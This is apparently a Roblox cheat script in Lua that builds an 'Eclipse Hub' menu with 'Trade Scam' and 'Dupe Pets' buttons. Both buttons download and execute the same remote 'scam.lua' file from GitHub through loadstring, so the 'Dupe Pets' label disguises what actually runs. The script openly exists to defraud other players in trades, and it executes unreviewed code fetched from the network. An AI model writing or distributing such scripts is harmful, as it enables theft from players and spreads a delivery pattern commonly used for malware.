local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Eclipse Hub", HidePremium = false, IntroText ="by Eclipse", SaveConfig = true, ConfigFolder = "Eclipse Hub"})

OrionLib:MakeNotification({

    Name = "Loading Trade Scam Script",

    Content = "LOADING",

    Image = "rbxassetid://4483345998",

    Time = 5

})

  

local TutTab = Window:MakeTab({

    Name = "Trade Scam",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

  local Section = TutTab:AddSection({

    Name = "Trade Scam"

})

TutTab:AddButton({

    Name = "Trade Scam",

    Callback = function()

              print("loading please wait")

      loadstring(game:HttpGet("https://raw.githubusercontent.com/WhoAsked9/scriptpsx/main/scam.lua"))()

      end    

})

TutTab:AddButton({

    Name = "Dupe Pets",

    Callback = function()

              print("loading please wait")

loadstring(game:HttpGet("https://raw.githubusercontent.com/WhoAsked9/scriptpsx/main/scam.lua"))()

    end

    

})

  OrionLib:Init()
